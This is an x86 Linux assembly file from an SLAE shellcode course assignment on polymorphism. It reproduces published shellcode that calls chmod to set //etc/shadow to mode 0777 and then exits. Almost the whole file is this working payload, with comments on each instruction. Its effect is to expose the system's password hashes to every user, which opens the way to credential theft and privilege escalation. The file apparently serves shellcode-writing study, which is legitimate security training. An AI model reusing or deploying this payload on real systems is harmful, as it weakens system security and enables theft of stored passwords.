;#SLAE Assignment #06: Polymorphism
;#Original Shellcode from: http://shell-storm.org/shellcode/files/shellcode-590.php


section .text
global _start

_start: ;Original Version    
	xor eax,eax		;eax=0
	push eax		;nullword on stack
	mov al,0xf		;eax=15 -> chmod syscall
	push dword 0x776f6461	;"woda"
	push dword 0x68732f63	;"hs/c"
	push dword 0x74652f2f	;"te//" -> "//etc/shadow"
	mov ebx,esp		;stringpointer
	xor ecx,ecx		;ecx=0
	mov cx,0x1ff		;777_8
	int 0x80		;run chmod
	inc eax			;eax=1 if retval=0
	int 0x80		;exit

